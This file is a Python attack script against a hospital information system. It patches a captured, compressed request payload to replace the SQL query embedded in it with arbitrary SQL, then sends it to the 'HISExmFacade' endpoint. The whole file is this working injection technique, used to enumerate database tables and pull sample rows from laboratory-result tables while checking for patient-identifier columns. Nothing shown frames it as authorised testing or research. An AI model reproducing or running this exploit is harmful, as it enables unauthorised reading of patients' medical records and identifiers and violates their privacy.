from his_client_final import HISClient
import requests
import zlib
import re

class ValueLabHunter(HISClient):
    def execute_sql(self, sql):
        # print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                # Try simple truncation if select *
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = ValueLabHunter()

# 1. Find all VALUELAB tables
print("Searching for VALUELAB tables...")
sql = "SELECT OWNER, TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE 'VALUELAB%' AND ROWNUM <= 20"
res = hunter.execute_sql(sql)
if res and "<NewDataSet>" in res:
     print(res[:2000])

# 2. Check PCUN.TB_LIS_RESULT schema/sample
print("\nChecking PCUN.TB_LIS_RESULT sample...")
q_sample = "SELECT * FROM PCUN.TB_LIS_RESULT WHERE ROWNUM <= 1"
res_sample = hunter.execute_sql(q_sample)
if res_sample and "<NewDataSet>" in res_sample:
     print(res_sample[:2000])
     # Check key columns
     if "HHISNUM" in res_sample: print("Has HHISNUM")
     if "HCASENO" in res_sample: print("Has HCASENO")
     if "HIDNO" in res_sample: print("Has HIDNO")
else:
     print("[-] Could not get sample from PCUN.TB_LIS_RESULT")

# 3. Check OPDUSR.VALUELAB_20220323 sample (if it exists)
print("\nChecking OPDUSR.VALUELAB_20220323 sample...")
q_val = "SELECT * FROM OPDUSR.VALUELAB_20220323 WHERE ROWNUM <= 1"
res_val = hunter.execute_sql(q_val)
if res_val and "<NewDataSet>" in res_val:
     print(res_val[:2000])
